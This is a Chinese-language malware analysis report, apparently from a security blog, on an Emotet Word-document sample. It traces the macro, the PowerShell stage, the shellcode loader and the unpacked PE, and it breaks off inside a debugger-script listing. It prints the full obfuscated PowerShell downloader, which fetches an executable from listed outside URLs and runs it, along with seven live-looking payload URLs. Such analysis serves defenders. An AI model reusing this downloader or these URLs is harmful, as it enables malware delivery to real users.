    <content type="html"><![CDATA[<h1 id="Emotet病毒分析报告"><a href="#Emotet病毒分析报告" class="headerlink" title="Emotet病毒分析报告"></a>Emotet病毒分析报告</h1><h2 id="样本基础信息"><a href="#样本基础信息" class="headerlink" title="样本基础信息"></a>样本基础信息</h2><table><thead><tr><th><strong>Name</strong></th><th><strong>#679.doc</strong></th></tr></thead><tbody><tr><td><strong>Size</strong></td><td><strong>199168 bytes</strong></td></tr><tr><td><strong>MD5</strong></td><td><strong>ED4720EEF9F693EB0E4FACA5251F297B</strong></td></tr><tr><td><strong>SHA1</strong></td><td><strong>961444B030CEA0426CC13EDCECBA6E0BAD67AF54</strong></td></tr></tbody></table><h2 id="样本执行流程"><a href="#样本执行流程" class="headerlink" title="样本执行流程"></a>样本执行流程</h2><p><img src="https://gitee.com/recird/blogimages/raw/master/img/%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.jpg" alt="执行流程" style="zoom:80%;" /></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><ul><li>拿到该样本，先使用oledump.py扫描查看其是否有恶意的宏代码，并将扫描到的恶意的宏代码直接dump到文件中查看并分析</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029154907046.png" alt="image-20201029154907046"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029155241695.png" alt="image-20201029155241695"></p><ul><li>初步分析发现，宏代码中有大量的混淆，则通过动态调试来分析其宏的具体行为，使用<strong>Process Monitor</strong>记录其行为，通过关键字符串CreateObject定位到其创建对象的代码，调试发现其通过创建<strong>winmgmts:win32_Process</strong>对象，调用<strong>Win32_Process</strong>的<a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process">Create</a>方法创建<strong>powershell</strong>进程来执行恶意代码</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029155618158.png" alt="image-20201029155618158"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029161325040.png" alt="image-20201029161325040"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029161451846.png" alt="image-20201029161451846"></p><ul><li>提取到的powershell执行的命令，其执行的代码使用Base64编码过，通过解码整理，内容如下:</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qWM</span> = [<span class="type">TyPe</span>](<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;3&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ySte&#x27;</span>,<span class="string">&#x27;eCtoRY&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;M.io.Dir&#x27;</span>);</span><br><span class="line"><span class="variable">$dj9ay</span>=  [<span class="type">TYPe</span>](<span class="string">&quot;&#123;2&#125;&#123;5&#125;&#123;3&#125;&#123;1&#125;&#123;6&#125;&#123;4&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;STem.&#x27;</span>,<span class="string">&#x27;AnagE&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;eT.sERvIcEpoiNTM&#x27;</span>)  ;</span><br><span class="line"><span class="variable">$Ih0wdgz</span>=(<span class="string">&#x27;D&#x27;</span>+<span class="string">&#x27;w&#x27;</span>+(<span class="string">&#x27;cki&#x27;</span>+<span class="string">&#x27;7n&#x27;</span>));</span><br><span class="line"><span class="variable">$R92c4ei</span>=<span class="variable">$J61aukd</span> + [<span class="built_in">char</span>](<span class="number">64</span>) + <span class="variable">$Zl1jgr3</span>;<span class="variable">$Pa3vgxf</span>=((<span class="string">&#x27;Y&#x27;</span>+<span class="string">&#x27;1zv&#x27;</span>)+<span class="string">&#x27;se&#x27;</span>+<span class="string">&#x27;x&#x27;</span>);  </span><br><span class="line">(VaRIABLe (<span class="string">&#x27;qW&#x27;</span>+<span class="string">&#x27;m&#x27;</span>) <span class="literal">-Va</span> )::<span class="string">&quot;CReA`Te`DiRE`cT`oRy&quot;</span>(<span class="variable">$HOME</span> + ((<span class="string">&#x27;Y&#x27;</span>+(<span class="string">&#x27;lcZ&#x27;</span>+<span class="string">&#x27;xu4&#x27;</span>+<span class="string">&#x27;guoYl&#x27;</span>)+(<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;B8sw&#x27;</span>)+(<span class="string">&#x27;i0&#x27;</span>+<span class="string">&#x27;l&#x27;</span>)+(<span class="string">&#x27;Yl&#x27;</span>+<span class="string">&#x27;c&#x27;</span>)).<span class="string">&quot;Re`PlACe&quot;</span>(([<span class="built_in">CHar</span>]<span class="number">89</span>+[<span class="built_in">CHar</span>]<span class="number">108</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>),<span class="string">&#x27;\&#x27;</span>)));</span><br><span class="line"><span class="variable">$Nfjojlg</span>=(<span class="string">&#x27;D_&#x27;</span>+(<span class="string">&#x27;w&#x27;</span>+<span class="string">&#x27;4q&#x27;</span>)+<span class="string">&#x27;pz&#x27;</span>); </span><br><span class="line">(<span class="built_in">gET-vArIABLE</span> (<span class="string">&#x27;d&#x27;</span>+<span class="string">&#x27;j9ay&#x27;</span>)).VAlue::<span class="string">&quot;sEcurI`T`Yp`RoT`oCol&quot;</span> = (<span class="string">&#x27;T&#x27;</span>+(<span class="string">&#x27;ls&#x27;</span>+<span class="string">&#x27;12&#x27;</span>));</span><br><span class="line"><span class="variable">$Vnyie3g</span>=(<span class="string">&#x27;S&#x27;</span>+(<span class="string">&#x27;8&#x27;</span>+<span class="string">&#x27;c6&#x27;</span>)+(<span class="string">&#x27;ws&#x27;</span>+<span class="string">&#x27;s&#x27;</span>));</span><br><span class="line"><span class="variable">$Mvczxed</span> = (<span class="string">&#x27;Ru&#x27;</span>+<span class="string">&#x27;2a&#x27;</span>+(<span class="string">&#x27;hnr&#x27;</span>+<span class="string">&#x27;k5&#x27;</span>));</span><br><span class="line"><span class="variable">$Lhamnta</span>=(<span class="string">&#x27;T&#x27;</span>+<span class="string">&#x27;eq&#x27;</span>+(<span class="string">&#x27;pc&#x27;</span>+<span class="string">&#x27;20&#x27;</span>));</span><br><span class="line"><span class="variable">$Rmjmpwr</span>=((<span class="string">&#x27;D8z&#x27;</span>+<span class="string">&#x27;y&#x27;</span>)+<span class="string">&#x27;rr&#x27;</span>+<span class="string">&#x27;8&#x27;</span>);</span><br><span class="line"><span class="variable">$Nhv2h_0</span>=<span class="variable">$HOME</span>+(((<span class="string">&#x27;2W&#x27;</span>+<span class="string">&#x27;y&#x27;</span>)+(<span class="string">&#x27;Z&#x27;</span>+<span class="string">&#x27;xu&#x27;</span>)+<span class="string">&#x27;4&#x27;</span>+<span class="string">&#x27;g&#x27;</span>+(<span class="string">&#x27;uo&#x27;</span>+<span class="string">&#x27;2&#x27;</span>)+(<span class="string">&#x27;W&#x27;</span>+<span class="string">&#x27;yB8s&#x27;</span>)+(<span class="string">&#x27;w&#x27;</span>+<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;0l2Wy&#x27;</span>)) <span class="operator">-CREplACE</span> ([<span class="built_in">chAR</span>]<span class="number">50</span>+[<span class="built_in">chAR</span>]<span class="number">87</span>+[<span class="built_in">chAR</span>]<span class="number">121</span>),[<span class="built_in">chAR</span>]<span class="number">92</span>)+<span class="variable">$Mvczxed</span>+(<span class="string">&#x27;.&#x27;</span>+(<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;xe&#x27;</span>));</span><br><span class="line"><span class="variable">$Kol_1nt</span>=((<span class="string">&#x27;V&#x27;</span>+<span class="string">&#x27;w3n&#x27;</span>)+(<span class="string">&#x27;pj&#x27;</span>+<span class="string">&#x27;s&#x27;</span>));</span><br><span class="line"><span class="variable">$N9rda3l</span>=&amp;(<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;ew-obj&#x27;</span>+<span class="string">&#x27;ect&#x27;</span>) net.wEbcLieNt; <span class="comment">##创建net.webclient对象用于下载</span></span><br><span class="line">//URL列表</span><br><span class="line"><span class="variable">$Wac_hly</span>=(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;tt&#x27;</span>+(<span class="string">&#x27;p&#x27;</span>+<span class="string">&#x27;s:&#x27;</span>)+(<span class="string">&#x27;[&#x27;</span>+<span class="string">&#x27; uNHs ]&#x27;</span>+<span class="string">&#x27;[ uNHs &#x27;</span>+<span class="string">&#x27;]e&#x27;</span>+<span class="string">&#x27;-&#x27;</span>)+(<span class="string">&#x27;sp&#x27;</span>+<span class="string">&#x27;aic.&#x27;</span>)+<span class="string">&#x27;p&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+(<span class="string">&#x27;[ uNHs&#x27;</span>+<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;h&#x27;</span>)+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;k&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+(<span class="string">&#x27;_li&#x27;</span>+<span class="string">&#x27;st&#x27;</span>)+(<span class="string">&#x27;[&#x27;</span>+<span class="string">&#x27; uN&#x27;</span>)+<span class="string">&#x27;Hs&#x27;</span>+(<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;]LK&#x27;</span>)+<span class="string">&#x27;[ &#x27;</span>+(<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;NHs&#x27;</span>)+(<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;@&#x27;</span>+<span class="string">&#x27;https:&#x27;</span>+<span class="string">&#x27;[&#x27;</span>)+<span class="string">&#x27; u&#x27;</span>+(<span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;Hs &#x27;</span>)+<span class="string">&#x27;]&#x27;</span>+(<span class="string">&#x27;[&#x27;</span>+<span class="string">&#x27; u&#x27;</span>+<span class="string">&#x27;NHs ]&#x27;</span>)+<span class="string">&#x27;ag&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;ci&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+(<span class="string">&#x27;in&#x27;</span>+<span class="string">&#x27;f&#x27;</span>)+(<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;ue&#x27;</span>)+<span class="string">&#x27;nc&#x27;</span>+<span class="string">&#x27;ia&#x27;</span>+<span class="string">&#x27;r&#x27;</span>+(<span class="string">&#x27;.co&#x27;</span>+<span class="string">&#x27;m.&#x27;</span>)+<span class="string">&#x27;b&#x27;</span>+(<span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;[ uN&#x27;</span>)+(<span class="string">&#x27;H&#x27;</span>+<span class="string">&#x27;s &#x27;</span>)+<span class="string">&#x27;]&#x27;</span>+<span class="string">&#x27;in&#x27;</span>+(<span class="string">&#x27;d&#x27;</span>+<span class="string">&#x27;exi&#x27;</span>)+<span class="string">&#x27;ng&#x27;</span>+(<span class="string">&#x27;[ uN&#x27;</span>+<span class="string">&#x27;H&#x27;</span>)+(<span class="string">&#x27;s &#x27;</span>+<span class="string">&#x27;]&#x27;</span>)+<span class="string">&#x27;X[&#x27;</span>+<span class="string">&#x27; u&#x27;</span>+(<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s ]@http&#x27;</span>+<span class="string">&#x27;s:[&#x27;</span>+<span class="string">&#x27; &#x27;</span>)+<span class="string">&#x27;u&#x27;</span>+(<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)+(<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;[&#x27;</span>)+<span class="string">&#x27; &#x27;</span>+(<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;NHs&#x27;</span>)+(<span class="string">&#x27; ]dm&#x27;</span>+<span class="string">&#x27;l&#x27;</span>)+(<span class="string">&#x27;ink&#x27;</span>+<span class="string">&#x27;s.&#x27;</span>+<span class="string">&#x27;bid[ uNH&#x27;</span>)+(<span class="string">&#x27;s ]w&#x27;</span>+<span class="string">&#x27;p&#x27;</span>)+<span class="string">&#x27;-c&#x27;</span>+(<span class="string">&#x27;on&#x27;</span>+<span class="string">&#x27;tent&#x27;</span>)+(<span class="string">&#x27;[ u&#x27;</span>+<span class="string">&#x27;NH&#x27;</span>)+(<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27; ]n4&#x27;</span>+<span class="string">&#x27;[ u&#x27;</span>)+<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27; &#x27;</span>+(<span class="string">&#x27;]&#x27;</span>+<span class="string">&#x27;@htt&#x27;</span>)+(<span class="string">&#x27;p:[ &#x27;</span>+<span class="string">&#x27;u&#x27;</span>)+<span class="string">&#x27;NH&#x27;</span>+(<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27; ][ &#x27;</span>+<span class="string">&#x27;uNH&#x27;</span>)+(<span class="string">&#x27;s ]ww&#x27;</span>+<span class="string">&#x27;w.&#x27;</span>)+<span class="string">&#x27;h&#x27;</span>+(<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)+(<span class="string">&#x27;ar&#x27;</span>+<span class="string">&#x27;a&#x27;</span>)+<span class="string">&#x27;v&#x27;</span>+<span class="string">&#x27;an&#x27;</span>+(<span class="string">&#x27;s.co&#x27;</span>+<span class="string">&#x27;.u&#x27;</span>+<span class="string">&#x27;k&#x27;</span>+<span class="string">&#x27;[ uNHs &#x27;</span>)+(<span class="string">&#x27;]&#x27;</span>+<span class="string">&#x27;wp-&#x27;</span>)+(<span class="string">&#x27;admin[&#x27;</span>+<span class="string">&#x27; uN&#x27;</span>+<span class="string">&#x27;Hs ]sUy&#x27;</span>+<span class="string">&#x27;[ u&#x27;</span>+<span class="string">&#x27;NH&#x27;</span>)+(<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27; ]&#x27;</span>)+<span class="string">&#x27;@h&#x27;</span>+(<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;tp&#x27;</span>)+(<span class="string">&#x27;:&#x27;</span>+<span class="string">&#x27;[ &#x27;</span>)+(<span class="string">&#x27;uNH&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)+(<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;][ &#x27;</span>)+<span class="string">&#x27;uN&#x27;</span>+(<span class="string">&#x27;Hs&#x27;</span>+<span class="string">&#x27; ]w&#x27;</span>)+<span class="string">&#x27;ww&#x27;</span>+<span class="string">&#x27;.w&#x27;</span>+(<span class="string">&#x27;nd&#x27;</span>+<span class="string">&#x27;z.h&#x27;</span>)+(<span class="string">&#x27;k[ &#x27;</span>+<span class="string">&#x27;u&#x27;</span>)+(<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)+(<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;me&#x27;</span>)+(<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;sa&#x27;</span>)+(<span class="string">&#x27;ge[&#x27;</span>+<span class="string">&#x27; uNH&#x27;</span>+<span class="string">&#x27;s &#x27;</span>)+<span class="string">&#x27;]&#x27;</span>+(<span class="string">&#x27;rys[ &#x27;</span>+<span class="string">&#x27;uN&#x27;</span>+<span class="string">&#x27;Hs ]@h&#x27;</span>)+(<span class="string">&#x27;ttps&#x27;</span>+<span class="string">&#x27;:&#x27;</span>)+(<span class="string">&#x27;[&#x27;</span>+<span class="string">&#x27; u&#x27;</span>)+(<span class="string">&#x27;NHs &#x27;</span>+<span class="string">&#x27;][ uNHs&#x27;</span>+<span class="string">&#x27; &#x27;</span>)+<span class="string">&#x27;]&#x27;</span>+(<span class="string">&#x27;pr&#x27;</span>+<span class="string">&#x27;ot&#x27;</span>)+(<span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;ek-v&#x27;</span>)+(<span class="string">&#x27;i&#x27;</span>+<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;t&#x27;</span>+<span class="string">&#x27;nam.&#x27;</span>+<span class="string">&#x27;vn[ uNHs ]&#x27;</span>+<span class="string">&#x27;wp-&#x27;</span>+<span class="string">&#x27;c&#x27;</span>)+<span class="string">&#x27;on&#x27;</span>+(<span class="string">&#x27;tent[&#x27;</span>+<span class="string">&#x27; u&#x27;</span>)+(<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)+<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;l6&#x27;</span>+<span class="string">&#x27;x[&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;u&#x27;</span>+(<span class="string">&#x27;NH&#x27;</span>+<span class="string">&#x27;s &#x27;</span>)+<span class="string">&#x27;]@&#x27;</span>+<span class="string">&#x27;h&#x27;</span>+(<span class="string">&#x27;ttps&#x27;</span>+<span class="string">&#x27;:&#x27;</span>)+(<span class="string">&#x27;[&#x27;</span>+<span class="string">&#x27; uNH&#x27;</span>)+(<span class="string">&#x27;s ][&#x27;</span>+<span class="string">&#x27; uN&#x27;</span>)+(<span class="string">&#x27;H&#x27;</span>+<span class="string">&#x27;s &#x27;</span>)+(<span class="string">&#x27;]gsho&#x27;</span>+<span class="string">&#x27;ck&#x27;</span>)+(<span class="string">&#x27;-&#x27;</span>+<span class="string">&#x27;vi&#x27;</span>+<span class="string">&#x27;etnam.vn&#x27;</span>)+<span class="string">&#x27;[&#x27;</span>+(<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;uN&#x27;</span>)+(<span class="string">&#x27;H&#x27;</span>+<span class="string">&#x27;s ]wp-&#x27;</span>+<span class="string">&#x27;c&#x27;</span>)+<span class="string">&#x27;on&#x27;</span>+(<span class="string">&#x27;te&#x27;</span>+<span class="string">&#x27;n&#x27;</span>)+<span class="string">&#x27;t&#x27;</span>+(<span class="string">&#x27;[ u&#x27;</span>+<span class="string">&#x27;N&#x27;</span>)+<span class="string">&#x27;Hs&#x27;</span>+<span class="string">&#x27; ]&#x27;</span>+<span class="string">&#x27;dZ&#x27;</span>+(<span class="string">&#x27;If&#x27;</span>+<span class="string">&#x27;h&#x27;</span>)+<span class="string">&#x27;a&#x27;</span>+(<span class="string">&#x27;3r&#x27;</span>+<span class="string">&#x27;[ &#x27;</span>)+<span class="string">&#x27;uN&#x27;</span>+<span class="string">&#x27;Hs&#x27;</span>+<span class="string">&#x27; ]&#x27;</span>).<span class="string">&quot;repla`cE&quot;</span>((<span class="string">&#x27;[ &#x27;</span>+(<span class="string">&#x27;uN&#x27;</span>+<span class="string">&#x27;Hs&#x27;</span>)+<span class="string">&#x27; ]&#x27;</span>),([<span class="built_in">array</span>](<span class="string">&#x27;/&#x27;</span>),<span class="string">&#x27;fs&#x27;</span>)[<span class="number">0</span>]).<span class="string">&quot;S`pLiT&quot;</span>(<span class="variable">$Byzebsm</span> + <span class="variable">$R92c4ei</span> + <span class="variable">$Sjir5nu</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Fcayq06</span>=((<span class="string">&#x27;U&#x27;</span>+<span class="string">&#x27;1s4&#x27;</span>)+(<span class="string">&#x27;6e&#x27;</span>+<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line">//下载文件</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$Wprs0k0</span> <span class="keyword">in</span> <span class="variable">$Wac_hly</span>)</span><br><span class="line">&#123;<span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$N9rda3l</span>.<span class="string">&quot;downlOAdfiLe&quot;</span>(<span class="variable">$Wprs0k0</span>, <span class="variable">$Nhv2h_0</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$K1w444m</span>=(<span class="string">&#x27;Br&#x27;</span>+(<span class="string">&#x27;k&#x27;</span>+<span class="string">&#x27;qf&#x27;</span>)+<span class="string">&#x27;c1&#x27;</span>);</span><br><span class="line"><span class="keyword">If</span> ((.(<span class="string">&#x27;Get&#x27;</span>+<span class="string">&#x27;-It&#x27;</span>+<span class="string">&#x27;em&#x27;</span>) <span class="variable">$Nhv2h_0</span>).<span class="string">&quot;l`eNGth&quot;</span> <span class="operator">-ge</span> <span class="number">39487</span>) </span><br><span class="line">&#123;([<span class="type">wmiclass</span>](<span class="string">&#x27;win32_Process&#x27;</span>))).<span class="string">&quot;cREAte&quot;</span>(<span class="variable">$Nhv2h_0</span>);   //创建进程</span><br><span class="line"><span class="variable">$Mfmj5td</span>=((<span class="string">&#x27;Jl&#x27;</span>+<span class="string">&#x27;m&#x27;</span>)+(<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;t_w&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="variable">$Jce22rp</span>=(<span class="string">&#x27;Cw&#x27;</span>+(<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27;zo&#x27;</span>)+<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A3n0awv</span>=(<span class="string">&#x27;N&#x27;</span>+(<span class="string">&#x27;_qr_&#x27;</span>+<span class="string">&#x27;8&#x27;</span>+<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>这里的powershell命令使用了很多混淆来干扰分析，但只需要关注其调用downloadfile的位置，通过分析获取其下载url的列表，如下，该powershell命令执行后将从这些url中下载正确的文件到本地，并调用WMI的win32_Process的Create方法来创建进程启动下载的恶意程序。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://e-spaic.pt/hacks_list/LK/</span><br><span class="line">https://agenciainfluenciar.com.br/indexing/X/</span><br><span class="line">https://dmlinks.bid/wp-content/n4/</span><br><span class="line">http://www.hsecaravans.co.uk/wp-admin/sUy/</span><br><span class="line">http://www.wndz.hk/message/rys/</span><br><span class="line">https://protrek-vietnam.vn/wp-content/l6x/</span><br><span class="line">https://gshock-vietnam.vn/wp-content/dZIfha3r/</span><br></pre></td></tr></table></figure><h2 id="恶意PE分析"><a href="#恶意PE分析" class="headerlink" title="恶意PE分析"></a>恶意PE分析</h2><ul><li>基础信息</li></ul><table><thead><tr><th><strong>Name</strong></th><th><strong>goVN3FGpeHtOymox.exe</strong></th></tr></thead><tbody><tr><td><strong>Size</strong></td><td><strong>483328 字节</strong></td></tr><tr><td><strong>MD5</strong></td><td><strong>7B2525474A9A35825F918AA533676C5C</strong></td></tr><tr><td><strong>SHA1</strong></td><td><strong>C993629ECC2F42B7275318575FB59F9198049845</strong></td></tr></tbody></table><ul><li>使用Die对文件查壳，发现是一个标准的win32程序，导入表中也没有特别的异常，选择直接使用IDA分析该程序</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029174143741.png" alt="image-20201029174143741"></p><ul><li>使用IDA打开程序，直接进入main函数，通过分析发现其包含一些字符串处理、混淆的代码，找到其最核心的部分如下。获取资源数据，这里它使用两个ntdll的API来定位获取资源数据，先使用LdrFindResource_U找到PE中的资源数据入口结构(ResourceDataEntry)，然后调用LdrFindResource来获取资源数据的起始地址，获取到资源数据的地址和大小后，使用之前获取的VirtualAlloc申请一块与资源数据大小相同的内存空间，然后调用函数对数据进行解压解密获取到shellcode，最终直接跳转到shellcode中执行代码。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029191832749.png" alt="image-20201029191832749"></p><p><img src="C:\Users\jiayuan02\AppData\Roaming\Typora\typora-user-images\image-20201029192213360.png" alt="image-20201029192213360"></p><ul><li>这里将shellcode从内存中dump出来，使用IDA分析，同步使用OD动态调试。分析shellcode的代码，其通过遍历PEB获取所需的模块基址，然后通过遍历导出表获取导出函数名称，对函数名称进行加密后与原已经加密后硬编码的数据进行比较，来获取其所需的API，然后就是对PE文件的数据复制、内存对齐、导入表修复等操作，完成PE文件的内存扩展后，直接跳转到该PE的入口点</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201016172218257.png" alt="image-20201016172218257"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201016172624064.png" alt="image-20201016172624064"></p><p><img src="D:\SelfReport\Emotet\images\image-20201016172711482.png" alt="image-20201016172711482"></p><ul><li>将该PE从内存中dump出来，继续使用IDA分析，发现其入口传入参数似乎又是一个PE，将该PE dump出来，在该函数进一步调用的时候增加了几个函数的地址作为参数，猜测可能又会进行PE加载</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201016174012157.png" alt="image-20201016174012157"></p><ul><li>通过分析，该shellcode对PE文件进行解析，最后申请空间将PE展开，并修改当前进程信息，跳转到该PE的入口点处，核心的操作如下</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201019163420068.png" alt="image-20201019163420068"></p><ul><li>使用IDA对dump出来的PE分析，该程序无导入表，使用了大量的while+Switch循环来控制程序的执行流程，这给静态分析和动态分析都提升了很大的难度，进一步发现其在API调用使用不可逆的API hash运算结果对比方法。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029201039987.png" alt="image-20201029201039987"></p><p><img src="D:\SelfReport\Emotet\images\image-20201029201235882.png" alt="image-20201029201235882"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201029201944677.png" alt="image-20201029201944677"></p><ul><li>由于该程序没有导入表，所以想要完成恶意功能则只能通过上面的动态调用的方式，所以监测动态获取模块地址和动态获取函数地址就可以知道其真正的<strong>API</strong>调用流程。编写一个<strong>OD</strong>脚本对这两处关键函数进行监控，并对调用地址及调用函数进行输出，即可获取到其<strong>API</strong>调用序列，脚本如下，监测到的<strong>API</strong>如下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span 